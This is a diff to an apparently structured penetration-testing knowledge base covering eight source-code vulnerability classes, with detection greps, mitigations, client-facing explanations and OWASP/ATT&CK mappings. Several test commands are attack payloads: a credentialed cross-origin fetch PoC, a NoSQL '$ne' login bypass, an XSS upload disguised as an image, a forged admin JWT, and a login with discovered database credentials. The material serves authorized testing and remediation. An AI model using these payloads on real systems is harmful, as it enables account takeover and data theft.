@@ -10,7 +10,6 @@
   {
    "id": "SRC-001",
    "domain": "SRC",
-   "phase": 455,
    "title": "Insecure CORS Configuration (Source-Identified)",
    "sequence": 455,
    "severity": "high",
@@ -24,7 +23,8 @@
     "Locate the CORS configuration/middleware in source (searching for `Access-Control-Allow-Origin`, a CORS middleware package's configuration block, or a custom origin-matching function).",
     "Read the origin-matching logic precisely: does it echo the request's Origin header unconditionally, use a wildcard, or apply a substring/suffix match rather than an exact-match allowlist.",
     "Check whether `Access-Control-Allow-Credentials: true` is also configured alongside the permissive origin match, which is the combination that makes the misconfiguration exploitable for credentialed requests.",
-    "Build and run the application locally with the identified configuration, then confirm the runtime behavior matches the source by sending a request with an arbitrary `Origin` header and inspecting the response."
+    "Build and run the application locally with the identified configuration, then confirm the runtime behavior matches the source by sending a request with an arbitrary `Origin` header and inspecting the response.",
+    "Confirm whether the reflected origin is combined with credentialed responses in code, since that pairing is what makes the misconfiguration exploitable rather than merely permissive."
    ],
    "exploitationSteps": [
     "Confirm scope authorizes CORS-misconfiguration testing against a running build of the reviewed application.",
@@ -40,16 +40,21 @@
     },
     {
      "label": "Confirm runtime origin reflection",
-     "command": "curl -s -H 'Origin: https://evil-test.example.com' -I https://app.target.com/api/user/profile | grep -i 'access-control'"
+     "command": "curl -s -H 'Origin: https://<app>' -I https://<app>/api/user/profile | grep -i 'access-control'"
     },
     {
      "label": "Proof-of-concept cross-origin credentialed request page",
-     "command": "<script>\nfetch('https://app.target.com/api/user/profile', {credentials: 'include'})\n  .then(r => r.text()).then(t => document.write(t));\n</script>"
+     "command": "<script>\nfetch('https://<app>/api/user/profile', {credentials: 'include'})\n  .then(r => r.text()).then(t => document.write(t));\n</script>"
+    },
+    {
+     "label": "Search source for dynamic origin reflection paired with credentialed responses",
+     "command": "grep -rnE 'Access-Control-Allow-Origin.*(req|request)\\.|allowCredentials\\(true\\)|credentials:\\s*true' src/"
     }
    ],
    "variants": [
     "Origin matched via a substring/suffix check (e.g. `origin.endsWith('.target.com')`) bypassable by registering a lookalike subdomain, versus a full wildcard/unconditional-reflection pattern.",
-    "Permissive CORS present only on a specific subset of routes (added by a different developer at a different time) rather than applied uniformly across the whole API."
+    "Permissive CORS present only on a specific subset of routes (added by a different developer at a different time) rather than applied uniformly across the whole API.",
+    "A regex-based origin allowlist with an unanchored pattern, so an attacker-controlled domain containing the allowed string as a substring is accepted."
    ],
    "mitigation": [
     "Replace the permissive origin-matching logic with an explicit, exact-match allowlist of specific, legitimate origins maintained centrally in configuration.",
@@ -57,6 +62,7 @@
     "Add a static-analysis rule or code-review checklist item specifically flagging CORS-configuration changes for mandatory security review before merge.",
     "Include an automated test asserting the CORS policy's exact-match behavior (rejecting an unlisted test origin) in the CI test suite."
    ],
+   "mitigationClientFacing": "A review of your source code found that your application is written to accept requests from websites it should not trust, and in a way that — combined with returning user data — could let a malicious site a user visits make requests on that user's behalf. The fix is in the code: restrict which websites the application accepts requests from to a specific trusted list, and never pair open acceptance with sending user credentials. Because this was found by reading the code rather than testing a running system, confirm the fix on the built application too, to be sure the deployed behaviour matches the corrected source.",
    "reference": {
     "standard": "A05:2021 - Security Misconfiguration",
     "cwe": "CWE-942",
@@ -77,12 +83,33 @@
     "affectedEndpoints": [],
     "status": "not-tested"
    },
-   "flagged": false
+   "flagged": false,
+   "categoryStandard": "OWASP Top 10:2025",
+   "categoryCode": "A02",
+   "categoryName": "Security Misconfiguration",
+   "attack": [
+    {
+     "id": "T1190",
+     "name": "Exploit Public-Facing Application",
+     "matrix": "enterprise"
+    }
+   ],
+   "frameworks": [
+    {
+     "standard": "OWASP WSTG v4.2",
+     "code": "WSTG-CLNT",
+     "name": "Client-side"
+    },
+    {
+     "standard": "OWASP ASVS 5.0",
+     "code": "V4",
+     "name": "API and Web Service"
+    }
+   ]
   },
   {
    "id": "SRC-002",
    "domain": "SRC",
-   "phase": 456,
    "title": "Insecure Trust of Client-Supplied Content-Type Header in Code",
    "sequence": 456,
    "severity": "medium",
@@ -96,7 +123,8 @@
     "Locate the file-upload handling code and trace exactly what determines the file's accepted/rejected status and its stored/served type — the client-supplied `Content-Type` header, the filename's extension, or an independent content inspection.",
     "Confirm whether any magic-byte/signature-based content verification exists at all, distinct from a client-supplied metadata check.",
     "Build and run the application, then attempt to upload a file with mismatched content and declared type (e.g. an HTML file with a script payload, declared as `image/png` with a `.png` extension) and observe whether it's accepted.",
-    "If accepted, determine how the file is later served — with its stored, attacker-controlled Content-Type header, which would enable a browser to render/execute it as originally intended by the attacker despite the misleading extension."
+    "If accepted, determine how the file is later served — with its stored, attacker-controlled Content-Type header, which would enable a browser to render/execute it as originally intended by the attacker despite the misleading extension.",
+    "Trace where the client-declared content type drives a security decision — file handling, parsing, storage — since trusting it there is the exploitable pattern."
    ],
    "exploitationSteps": [
     "Confirm scope authorizes file-upload testing against a running build of the reviewed application.",
@@ -112,16 +140,21 @@
     },
     {
      "label": "Upload a mismatched-content file declared as an image",
-     "command": "curl -s -X POST https://app.target.com/upload -F 'file=@xss_payload.html;type=image/png;filename=photo.png'"
+     "command": "curl -s -X POST https://<app>/upload -F 'file=@xss_payload.html;type=image/png;filename=photo.png'"
     },
     {
      "label": "Access the uploaded file to check served Content-Type/execution",
-     "command": "curl -sI https://app.target.com/uploads/photo.png"
+     "command": "curl -sI https://<app>/uploads/photo.png"
+    },
+    {
+     "label": "Search source for content-type trusted from the request rather than verified",
+     "command": "grep -rnE 'getContentType\\(\\)|headers\\[.content-type.\\]|req\\.file\\.mimetype' src/"
     }
    ],
    "variants": [
     "Trust in the client-supplied filename extension alone (no Content-Type check at all) versus trust in the Content-Type header specifically — both share the same underlying flaw of trusting client-controlled metadata.",
-    "Mismatch exploited for stored XSS (the file is later rendered in a browser context) versus for direct server-side code execution (the file lands in a web-servable, script-executing directory)."
+    "Mismatch exploited for stored XSS (the file is later rendered in a browser context) versus for direct server-side code execution (the file lands in a web-servable, script-executing directory).",
+    "A file whose declared type is validated but whose actual content is never checked, so a disallowed file passes by mislabelling alone."
    ],
    "mitigation": [
     "Independently verify uploaded file content against its claimed type using magic-byte/signature inspection (or a dedicated file-type-detection library) rather than trusting the client-supplied Content-Type header or filename extension.",
@@ -129,6 +162,7 @@
     "Apply an allowlist of permitted, verified file types for the specific upload feature, rejecting anything outside it regardless of what the client claims.",
     "Set a restrictive Content-Security-Policy and `X-Content-Type-Options: nosniff` on any response serving user-uploaded content, as defense in depth against browser content-type sniffing."
    ],
+   "mitigationClientFacing": "Your code trusts the file type that a user's own request claims, rather than checking the file itself, which lets an attacker mislabel a dangerous file as a harmless one and have it accepted. A label supplied by the sender is not evidence of what a file actually is. The fix is to verify a file's real content rather than believing its declared type, and to base security decisions on that verified content. This is a focused code change at each point a file's claimed type drives a decision, and it closes a route by which forbidden files pass validation simply by lying about themselves.",
    "reference": {
     "standard": "A03:2021 - Injection",
     "cwe": "CWE-434",
@@ -149,12 +183,33 @@
     "affectedEndpoints": [],
     "status": "not-tested"
    },
-   "flagged": false
+   "flagged": false,
+   "categoryStandard": "OWASP Top 10:2025",
+   "categoryCode": "A06",
+   "categoryName": "Insecure Design",
+   "attack": [
+    {
+     "id": "T1505.003",
+     "name": "Web Shell",
+     "matrix": "enterprise"
+    }
+   ],
+   "frameworks": [
+    {
+     "standard": "OWASP WSTG v4.2",
+     "code": "WSTG-INPV",
+     "name": "Input Validation"
+    },
+    {
+     "standard": "OWASP ASVS 5.0",
+     "code": "V5",
+     "name": "File Handling"
+    }
+   ]
   },
   {
    "id": "SRC-003",
    "domain": "SRC",
-   "phase": 457,
    "title": "Hardcoded Credentials",
    "sequence": 457,
    "severity": "critical",
@@ -168,7 +223,8 @@
     "Run an automated secret-scanning tool across the full repository, including its complete commit history, not just the current working tree.",
     "Manually grep for common credential-indicating patterns (`password =`, `api_key =`, `secret =`, cloud-provider key formats) as a complement to automated scanning, which can miss non-standard variable naming.",
     "For each candidate found, trace its usage to confirm it's a genuine, live credential rather than an obviously-fake placeholder/example value.",
-    "Where a credential was found removed from the current HEAD but present in history, confirm whether it was also rotated, since removal from the current commit alone doesn't invalidate a credential that remains readable in history."
+    "Where a credential was found removed from the current HEAD but present in history, confirm whether it was also rotated, since removal from the current commit alone doesn't invalidate a credential that remains readable in history.",
+    "Build and run against a discovered credential in a read-only manner to confirm it is live rather than a stale or placeholder value before rating it."
    ],
    "exploitationSteps": [
     "Confirm scope authorizes credential extraction and, where applicable, validation from the reviewed source code/repository.",
@@ -189,11 +245,16 @@
     {
      "label": "Validate a discovered database credential (read-only check)",
      "command": "mysql -h <discovered-endpoint> -u <discovered-user> -p'<discovered-password>' -e 'SELECT 1;'"
+    },
+    {
+     "label": "Confirm a candidate is live rather than a placeholder by a read-only authentication check",
+     "command": "# use the discovered credential against its service in a read-only operation to confirm it authenticates"
     }
    ],
    "variants": [
     "Credential present in the current HEAD (immediately, actively exposed to anyone with repo access) versus only in historical commits (still exposed to anyone who clones the full history, but easy to overlook if only the current tree is reviewed).",
-    "A single, shared credential used across every environment (dev/staging/production all using the same hardcoded value), multiplying the impact of a single exposure."
+    "A single, shared credential used across every environment (dev/staging/production all using the same hardcoded value), multiplying the impact of a single exposure.",
+    "A credential embedded in a client-side bundle rather than server code, which is exposed to every user of the application rather than only those with repository access."
    ],
    "mitigation": [
     "Remove all hardcoded credentials from source code, supplying them at runtime via environment variables or a dedicated secrets-management service instead.",
@@ -201,6 +262,7 @@
     "Rotate any credential confirmed to have ever been committed to the repository, since simply removing it from the current commit doesn't invalidate a value still readable in history.",
     "Where history itself needs remediation (a credential is too sensitive to leave in history indefinitely), consider a history-rewriting/purge process in addition to rotation, understanding the operational disruption this causes for a shared repository."
    ],
+   "mitigationClientFacing": "Your source code contains passwords, keys or other credentials written directly into it, where anyone with access to the code — and, if it has ever been public or shared, potentially others — can read and use them. Credentials in code are also frequently the same across every environment, so one leak affects all of them. The fix is to remove credentials from the code entirely, load them at run time from a proper secrets manager, and rotate any that were exposed on the assumption they are already known. Check the code's history as well as its current state, since a credential removed today remains in the history unless purged.",
    "reference": {
     "standard": "A07:2021 - Identification and Authentication Failures",
     "cwe": "CWE-798",
@@ -221,12 +283,33 @@
     "affectedEndpoints": [],
     "status": "not-tested"
    },
-   "flagged": false
+   "flagged": false,
+   "categoryStandard": "OWASP Top 10:2025",
+   "categoryCode": "A07",
+   "categoryName": "Authentication Failures",
+   "attack": [
+    {
+     "id": "T1552.001",
+     "name": "Credentials In Files",
+     "matrix": "enterprise"
+    }
+   ],
+   "frameworks": [
+    {
+     "standard": "OWASP WSTG v4.2",
+     "code": "WSTG-ATHN",
+     "name": "Authentication"
+    },
+    {
+     "standard": "OWASP ASVS 5.0",
+     "code": "V6",
+     "name": "Authentication"
+    }
+   ]
   },
   {
    "id": "SRC-004",
    "domain": "SRC",
-   "phase": 458,
    "title": "Insufficient Entropy in Session Token Generation (Source-Identified)",
    "sequence": 458,
    "severity": "high",
@@ -240,7 +323,8 @@
     "Locate the exact code path generating session tokens/identifiers and identify the specific randomness API used.",
     "Confirm whether the API is a cryptographically secure generator (`SecureRandom`, `crypto.randomBytes`) or a standard, non-cryptographic one (`Math.random()`, `java.util.Random`, a weak hash of predictable input).",
     "Where a CSPRNG is used, check how it's seeded, since a predictable seed can undermine an otherwise-correct algorithm choice.",
-    "Collect a sample of generated tokens from a running build (for test accounts) and statistically analyze them for patterns consistent with the weak generator identified in source, confirming the source-level finding is practically exploitable."
+    "Collect a sample of generated tokens from a running build (for test accounts) and statistically analyze them for patterns consistent with the weak generator identified in source, confirming the source-level finding is practically exploitable.",
+    "Trace the token generator to its randomness source, and confirm empirically by sampling many issued tokens for structure rather than relying on the code alone."
    ],
    "exploitationSteps": [
     "Confirm scope authorizes token-sample collection and predictability analysis against a running build of the reviewed application.",
@@ -256,16 +340,21 @@
     },
     {
      "label": "Collect a sample of generated tokens for statistical analysis",
-     "command": "for i in $(seq 1 50); do curl -s -c - https://app.target.com/login -d 'user=test'$i'&pass=testpass' | grep -i sessionid; done"
+     "command": "for i in $(seq 1 50); do curl -s -c - https://<app>/login -d 'user=test'$i'&pass=testpass' | grep -i sessionid; done"
     },
     {
      "label": "Statistically test collected tokens for predictability",
      "command": "python3 analyze_token_entropy.py collected_tokens.txt"
+    },
+    {
+     "label": "Search source for token generation drawing on a non-cryptographic source",
+     "command": "grep -rnE 'Math\\.random|java\\.util\\.Random|new Random\\(|rand\\(\\)|mt_rand' src/ | grep -iE 'token|session|nonce|otp|reset'"
     }
    ],
    "variants": [
     "Non-cryptographic PRNG used directly for the token versus a cryptographically-appropriate generator undermined by a predictable seed (timestamp-based).",
-    "Weak randomness affecting session tokens specifically versus other security-critical identifiers generated by the same weak routine (password-reset tokens, API keys) elsewhere in the codebase."
+    "Weak randomness affecting session tokens specifically versus other security-critical identifiers generated by the same weak routine (password-reset tokens, API keys) elsewhere in the codebase.",
+    "A cryptographically-sourced token undermined by being truncated to too few characters, reintroducing guessability despite a sound generator."
    ],
    "mitigation": [
     "Use a cryptographically secure random number generator for every session token/identifier and any other security-critical random value.",
@@ -273,6 +362,7 @@
     "Audit the codebase for every randomness-generation call site as part of a security-focused code review, distinguishing security-sensitive uses from genuinely non-sensitive ones.",
     "Ensure session tokens carry sufficient length/entropy (128 bits or more of true randomness) regardless of the specific generator chosen."
    ],
+   "mitigationClientFacing": "The values your application uses to identify a logged-in user's session are generated in a way that is not sufficiently unpredictable, which means an attacker could guess or predict a valid session and take over an account without a password. Session identifiers are only safe if they cannot be anticipated. The fix is to generate them from the platform's proper cryptographic random source and to make them long enough that guessing is infeasible. This was identified in the code and should be confirmed on the running system; it warrants prompt attention because it bears directly on whether one user can impersonate another.",
    "reference": {
     "standard": "A02:2021 - Cryptographic Failures",
     "cwe": "CWE-331",
@@ -293,12 +383,33 @@
     "affectedEndpoints": [],
     "status": "not-tested"
    },
-   "flagged": false
+   "flagged": false,
+   "categoryStandard": "OWASP Top 10:2025",
+   "categoryCode": "A04",
+   "categoryName": "Cryptographic Failures",
+   "attack": [
+    {
+     "id": "T1550.001",
+     "name": "Application Access Token",
+     "matrix": "enterprise"
+    }
+   ],
+   "frameworks": [
+    {
+     "standard": "OWASP WSTG v4.2",
+     "code": "WSTG-CRYP",
+     "name": "Cryptography"
+    },
+    {
+     "standard": "OWASP ASVS 5.0",
+     "code": "V7",
+     "name": "Session Management"
+    }
+   ]
   },
   {
    "id": "SRC-005",
    "domain": "SRC",
-   "phase": 459,
    "title": "Server-Side Authentication Bypass Logic",
    "sequence": 459,
    "severity": "critical",
@@ -312,7 +423,8 @@
     "Read the complete authentication-logic code path line by line, tracing every conditional branch from request receipt to the final authenticated/rejected decision, for every supported authentication method (password, SSO, remember-me, API key).",
     "Pay particular attention to negation operators, early-return statements, and comparison operators (especially loose/coercive equality in dynamically-typed languages) that could behave unexpectedly for a specific, crafted input.",
     "For each suspicious construct identified, reason through what specific input would trigger the unintended code path, and note it as a hypothesis to validate at runtime.",
-    "Build and run the application, then attempt the crafted input against the identified code path to confirm whether the bypass is practically exploitable."
+    "Build and run the application, then attempt the crafted input against the identified code path to confirm whether the bypass is practically exploitable.",
+    "Build the application and exercise the authentication path directly, confirming that the identified bypass condition is reachable at run time and not guarded elsewhere."
    ],
    "exploitationSteps": [
     "Confirm scope authorizes authentication-bypass testing against a running build of the reviewed application, using the specific flaw identified via source review.",
@@ -328,16 +440,21 @@
     },
     {
      "label": "Test a suspected type-coercion bypass in a loose-equality comparison",
-     "command": "curl -s -X POST https://app.target.com/login -H 'Content-Type: application/json' -d '{\"username\":\"admin\",\"password\":{\"$ne\":null}}'"
+     "command": "curl -s -X POST https://<app>/login -H 'Content-Type: application/json' -d '{\"username\":\"admin\",\"password\":{\"$ne\":null}}'"
     },
     {
      "label": "Test a suspected early-return/negation-logic bypass with a crafted parameter",
-     "command": "curl -s -X POST https://app.target.com/login -d 'username=admin&password=&bypass_flag=1'"
+     "command": "curl -s -X POST https://<app>/login -d 'username=admin&password=&bypass_flag=1'"
+    },
+    {
+     "label": "Search source for authentication decisions that can short-circuit to allow",
+     "command": "grep -rnE 'if\\s*\\(.*(isAdmin|authenticated|bypass|debug|skipAuth).*\\)|return\\s+true;?\\s*//' src/ | grep -iE 'auth|login|session'"
     }
    ],
    "variants": [
     "Bypass via a flawed password-comparison conditional versus via an SSO/remember-me code path that skips the primary check entirely under a specific, attacker-triggerable condition.",
-    "Bypass exploitable pre-authentication by any anonymous caller versus requiring some prior, lesser level of access to reach the flawed code path."
+    "Bypass exploitable pre-authentication by any anonymous caller versus requiring some prior, lesser level of access to reach the flawed code path.",
+    "A bypass gated on a debug or feature flag that is intended to be off in production but is enabled by a default or an environment misconfiguration."
    ],
    "mitigation": [
     "Rewrite the flawed conditional logic with clear, explicit, positively-stated checks (\"access is granted only if X is true\") rather than negated or implicitly-inverted conditions that are easy to get subtly wrong.",
@@ -345,6 +462,7 @@
     "Apply a fail-closed design principle throughout — any unexpected code path, exception, or unhandled condition during authentication should result in a rejected login, never an implicit success.",
     "Include comprehensive unit and integration tests covering every authentication code path and edge case (empty/null credentials, malformed input, every supported auth method) as a standing regression suite."
    ],
+   "mitigationClientFacing": "A review of your authentication code found logic that can be made to grant access when it should refuse — a condition that lets the login check be bypassed under certain inputs or settings. Because this is in the code that decides who gets in, its impact is broad. The fix is to remove the bypass path and ensure the authentication decision cannot be short-circuited, paying particular attention to any debug or feature flags that weaken the check and must be off in production. Given that it concerns the front door of the application, this should be treated as a high priority and confirmed on the built system.",
    "reference": {
     "standard": "A07:2021 - Identification and Authentication Failures",
     "cwe": "CWE-287",
@@ -365,12 +483,33 @@
     "affectedEndpoints": [],
     "status": "not-tested"
    },
-   "flagged": false
+   "flagged": false,
+   "categoryStandard": "OWASP Top 10:2025",
+   "categoryCode": "A07",
+   "categoryName": "Authentication Failures",
+   "attack": [
+    {
+     "id": "T1078",
+     "name": "Valid Accounts",
+     "matrix": "enterprise"
+    }
+   ],
+   "frameworks": [
+    {
+     "standard": "OWASP WSTG v4.2",
+     "code": "WSTG-ATHN",
+     "name": "Authentication"
+    },
+    {
+     "standard": "OWASP ASVS 5.0",
+     "code": "V6",
+     "name": "Authentication"
+    }
+   ]
   },
   {
    "id": "SRC-006",
    "domain": "SRC",
-   "phase": 460,
    "title": "Improper Session Management (Source-Identified)",
    "sequence": 460,
    "severity": "high",
@@ -384,7 +523,8 @@
     "Locate the session-creation and login-handling code and trace whether a new session identifier is generated/issued specifically at the point of successful authentication, versus the pre-login session identifier simply being \"upgraded\" to an authenticated state in place.",
     "Build and run the application, then capture the session identifier issued before login.",
     "Complete a login using that same pre-established session identifier (not allowing the client to accept a new cookie if one is offered) and confirm whether the identifier remains valid and now represents the authenticated session.",
-    "Where regeneration is confirmed absent, also check for the same gap at other privilege-transition points (a password change, an MFA step-up) beyond just the initial login."
+    "Where regeneration is confirmed absent, also check for the same gap at other privilege-transition points (a password change, an MFA step-up) beyond just the initial login.",
+    "Trace the session lifecycle in code — creation, renewal, invalidation — and build the application to confirm a logout or privilege change actually invalidates the server-side session."
    ],
    "exploitationSteps": [
     "Confirm scope authorizes session-fixation testing against a running build of the reviewed application, using a nominated test account.",
@@ -400,16 +540,21 @@
     },
     {
      "label": "Capture a pre-login session identifier",
-     "command": "curl -s -c cookies.txt https://app.target.com/ -v 2>&1 | grep -i set-cookie"
+     "command": "curl -s -c cookies.txt https://<app>/ -v 2>&1 | grep -i set-cookie"
     },
     {
      "label": "Complete login while retaining the pre-established session cookie, then confirm it remains valid",
-     "command": "curl -s -b cookies.txt -c cookies.txt -X POST https://app.target.com/login -d 'user=testaccount&pass=testpass'\ncurl -s -b cookies.txt https://app.target.com/account  # confirm authenticated access using the original, pre-login session ID"
+     "command": "curl -s -b cookies.txt -c cookies.txt -X POST https://<app>/login -d 'user=testaccount&pass=testpass'\ncurl -s -b cookies.txt https://<app>/account  # confirm authenticated access using the original, pre-login session ID"
+    },
+    {
+     "label": "Search source for session handling that omits invalidation or regeneration",
+     "command": "grep -rnE 'session|logout|invalidate|regenerate' src/ | grep -iE 'logout|destroy|invalidate|regenerate'"
     }
    ],
    "variants": [
     "Missing regeneration at login specifically versus at other privilege-transition points (password change, MFA completion, privilege elevation) — each represents a distinct instance of the same underlying gap.",
-    "Session-fixation exploitable via a URL-parameter-accepted session ID (the most severe, trivially attacker-supplied variant) versus only via a shared/kiosk-browser pre-set-cookie scenario."
+    "Session-fixation exploitable via a URL-parameter-accepted session ID (the most severe, trivially attacker-supplied variant) versus only via a shared/kiosk-browser pre-set-cookie scenario.",
+    "A session fixation variant where the identifier is not regenerated on login, letting an attacker fix a known identifier before the victim authenticates."
    ],
    "mitigation": [
     "Regenerate the session identifier explicitly at every privilege-transition point — most critically immediately upon successful login — invalidating the pre-existing, pre-authentication session identifier entirely.",
@@ -417,6 +562,7 @@
     "Use a well-maintained, security-reviewed session-management framework/library that handles regeneration automatically by default, rather than a custom implementation, wherever feasible.",
     "Include an automated test asserting the session identifier changes across the login transition in the standard regression-test suite."
    ],
+   "mitigationClientFacing": "Your code manages user sessions in a way that leaves them exploitable — for example not properly ending a session at logout, or not issuing a fresh session on login. That can let a session persist when it should not, or let an attacker fix a known session on a victim. The fix is to handle the full session lifecycle correctly in code: issue a new session on login, end it fully on logout and on privilege changes, and never reuse an identifier the user arrived with. These are well-established patterns, and getting them right is fundamental to keeping one user's session from being usable by another.",
    "reference": {
     "standard": "A07:2021 - Identification and Authentication Failures",
     "cwe": "CWE-384",
@@ -436,12 +582,33 @@
     "affectedEndpoints": [],
     "status": "not-tested"
    },
-   "flagged": false
+   "flagged": false,
+   "categoryStandard": "OWASP Top 10:2025",
+   "categoryCode": "A07",
+   "categoryName": "Authentication Failures",
+   "attack": [
+    {
+     "id": "T1539",
+     "name": "Steal Web Session Cookie",
+     "matrix": "enterprise"
+    }
+   ],
+   "frameworks": [
+    {
+     "standard": "OWASP WSTG v4.2",
+     "code": "WSTG-SESS",
+     "name": "Session Management"
+    },
+    {
+     "standard": "OWASP ASVS 5.0",
+     "code": "V7",
+     "name": "Session Management"
+    }
+   ]
   },
   {
    "id": "SRC-007",
    "domain": "SRC",
-   "phase": 461,
    "title": "Improper Privilege Management in Code",
    "sequence": 461,
    "severity": "high",
@@ -455,7 +622,8 @@
     "Locate all code responsible for assigning or checking user roles/privileges, including account-creation defaults, role-elevation/promotion functions, and any place a role value is read from a client-supplied source (a JWT claim, a cookie, a hidden form field).",
     "For a role-assignment default, trace what happens if the expected input determining the role is missing/null — does the code default to the least-privileged role, or does an unhandled case inadvertently resolve to something more permissive.",
     "For a role-elevation/promotion function, confirm it has its own, independent authorization check restricting who can invoke it, separate from simply being an authenticated user.",
-    "For any role value sourced from client-modifiable data, confirm whether the server treats it as authoritative without re-deriving/re-validating it against the actual, stored account role on each request."
+    "For any role value sourced from client-modifiable data, confirm whether the server treats it as authoritative without re-deriving/re-validating it against the actual, stored account role on each request.",
+    "Trace where privilege is assigned in code and confirm, by building and testing, that a lower-privileged caller cannot reach the assignment path."
    ],
    "exploitationSteps": [
     "Confirm scope authorizes privilege-management testing against a running build of the reviewed application, using the provided test accounts.",
@@ -471,16 +639,21 @@
     },
     {
      "label": "Attempt account creation with the role-determining input omitted",
-     "command": "curl -s -X POST https://app.target.com/register -d '{\"email\":\"test@example.com\",\"password\":\"TestPass123!\"}'"
+     "command": "curl -s -X POST https://<app>/register -d '{\"email\":\"test@example.test\",\"password\":\"TestPass123!\"}'"
     },
     {
      "label": "Attempt to modify a client-supplied role claim and confirm server-side re-validation (or its absence)",
-     "command": "curl -s https://app.target.com/admin/dashboard -H \"Authorization: Bearer $(python3 forge_jwt.py --role admin)\""
+     "command": "curl -s https://<app>/admin/dashboard -H \"Authorization: Bearer $(python3 forge_jwt.py --role admin)\""
+    },
+    {
+     "label": "Search source for role or privilege assignment reachable from request-controlled input",
+     "command": "grep -rnE 'setRole|grantRole|isAdmin\\s*=|role\\s*=\\s*(req|request)|permissions\\s*=' src/"
     }
    ],
    "variants": [
     "Unintended-elevation-by-default in an account-creation code path versus an unguarded privilege-elevation/promotion function callable by any authenticated user.",
-    "Client-supplied role value trusted without server-side re-validation, allowing direct client-side privilege claim forgery, distinct from a logic-flaw-driven unintended default."
+    "Client-supplied role value trusted without server-side re-validation, allowing direct client-side privilege claim forgery, distinct from a logic-flaw-driven unintended default.",
+    "A privilege check performed but on a role value the client can influence, so the check passes on attacker-supplied authority rather than server-established identity."
    ],
    "mitigation": [
     "Default every role-assignment code path to the least-privileged role explicitly, treating any missing/unexpected input as a reason to assign minimal privilege, never an elevated one.",
@@ -488,6 +661,7 @@
     "Never trust a client-supplied value (a JWT claim, a cookie) as the authoritative source of a user's current role; re-derive and verify it server-side from the stored account record on every request.",
     "Include privilege-management-specific test cases (missing inputs, unauthorized promotion attempts, forged role claims) in the standard security-focused test suite."
    ],
+   "mitigationClientFacing": "A review of your code found that privileges are assigned or checked in a way an attacker could influence — reaching a privilege-granting path they should not, or having the check rely on a role value the client can set. The result is that an ordinary user could obtain rights reserved for others. The fix is to establish the user's privileges from their authenticated server-side identity, never from anything the client supplies, and to ensure privilege-assigning code is not reachable by unprivileged callers. This is a route to gaining elevated access, so it warrants prompt attention and confirmation on the running application.",
    "reference": {
     "standard": "A01:2021 - Broken Access Control",
     "cwe": "CWE-269",
@@ -508,12 +682,33 @@
     "affectedEndpoints": [],
     "status": "not-tested"
    },
-   "flagged": false
+   "flagged": false,
+   "categoryStandard": "OWASP Top 10:2025",
+   "categoryCode": "A01",
+   "categoryName": "Broken Access Control",
+   "attack": [
+    {
+     "id": "T1068",
+     "name": "Exploitation for Privilege Escalation",
+     "matrix": "enterprise"
+    }
+   ],
+   "frameworks": [
+    {
+     "standard": "OWASP WSTG v4.2",
+     "code": "WSTG-ATHZ",
+     "name": "Authorization"
+    },
+    {
+     "standard": "OWASP ASVS 5.0",
+     "code": "V8",
+     "name": "Authorization"
+    }
+   ]
   },
   {
    "id": "SRC-008",
    "domain": "SRC",
-   "phase": 462,
    "title": "Missing/Improper Authorization Check",
    "sequence": 462,
    "severity": "critical",
@@ -527,7 +722,9 @@
     "For each endpoint/function handling a sensitive action, trace its complete execution path from request receipt to the action being performed, explicitly confirming whether an authorization check (ownership verification, role check) exists anywhere in that path.",
     "Pay particular attention to newer endpoints, endpoints that appear structurally similar to another, properly-authorized endpoint (suggesting a copy-paste origin that may have dropped the check), and endpoints reached via an unusual or secondary code path (a batch-operation handler, an internal API called by another service).",
     "For any function found with no authorization check at all, confirm this isn't compensated for by a check performed earlier in a shared middleware chain that the specific route might bypass.",
-    "Build and run the application, then confirm the finding at runtime by invoking the function using an account that should not be authorized for it."
+    "Build and run the application, then confirm the finding at runtime by invoking the function using an account that should not be authorized for it.",
+    "Enumerate the sensitive operations in the codebase and confirm each has an explicit authorisation check on its own path, not only on a shared entry point.",
+    "Build the application and confirm a lower-privileged caller is refused at each identified operation rather than relying on the code review alone."
    ],
    "exploitationSteps": [
     "Confirm scope authorizes missing-authorization-check testing against a running build of the reviewed application, using the provided test accounts.",
@@ -543,12 +740,21 @@
     },
     {
      "label": "Invoke the identified unprotected function using an unauthorized test account",
-     "command": "curl -s -X DELETE https://app.target.com/admin/users/999 -H \"Authorization: Bearer <low-privilege-test-token>\""
+     "command": "curl -s -X DELETE https://<app>/admin/users/999 -H \"Authorization: Bearer <low-privilege-test-token>\""
+    },
+    {
+     "label": "Search source for sensitive handlers and cross-check for a nearby authorisation call",
+     "command": "grep -rnE 'def |function |@(Get|Post|Put|Delete)Mapping|router\\.(get|post|put|delete)' src/ | grep -iE 'admin|delete|update|user|role'"
+    },
+    {
+     "label": "Confirm a sensitive handler enforces its own authorisation rather than relying on a shared entry point",
+     "command": "# invoke an identified sensitive handler as a lower-privileged user and confirm it independently refuses"
     }
    ],
    "variants": [
     "Missing check on a REST endpoint versus on a GraphQL mutation/resolver, the latter being easier to overlook given GraphQL's single-endpoint model spreading authorization logic across many individual resolvers.",
-    "Missing check reachable directly via the primary API versus only reachable via a secondary, internal-facing batch/bulk-operation endpoint that processes the same underlying action differently."
+    "Missing check reachable directly via the primary API versus only reachable via a secondary, internal-facing batch/bulk-operation endpoint that processes the same underlying action differently.",
+    "Authorisation enforced by a shared middleware that a newly-added route omits, so the gap appears not in the check but in a route that never passes through it."
    ],
    "mitigation": [
     "Apply a consistent, centrally-enforced authorization-check pattern (a decorator, middleware, or a mandatory code-review checklist item) to every function performing a sensitive action, rather than implementing checks ad hoc per endpoint.",
@@ -556,6 +762,7 @@
     "Include an automated test suite systematically verifying every endpoint/function enforces the expected authorization requirement, run as part of routine CI, not just periodic external assessments.",
     "Apply particular scrutiny during code review to newly-added or copy-paste-derived endpoints specifically for this class of omission."
    ],
+   "mitigationClientFacing": "Your code performs sensitive operations without consistently checking that the caller is authorised to perform them — the check is missing on some paths, or present only on a shared entry point that a newly-added route bypasses. That lets a user reach actions they should not. The fix is to enforce authorisation on every sensitive operation's own path, not only at a common gateway, so a route that skips the gateway does not skip the check. This is one of the most common sources of access-control failures, and it is best addressed both by fixing the identified gaps and by confirming that every route is covered.",
    "reference": {
     "standard": "A01:2021 - Broken Access Control",
     "cwe": "CWE-862",
@@ -575,12 +782,33 @@
     "affectedEndpoints": [],
     "status": "not-tested"
    },
-   "flagged": false
+   "flagged": false,
+   "categoryStandard": "OWASP Top 10:2025",
+   "categoryCode": "A01",
+   "categoryName": "Broken Access Control",
+   "attack": [
+    {
+     "id": "T1213",
+     "name": "Data from Information Repositories",
+     "matrix": "enterprise"
+    }
+   ],
+   "frameworks": [
+    {
+     "standard": "OWASP WSTG v4.2",
+     "code": "WSTG-ATHZ",
+     "name": "Authorization"
+    },
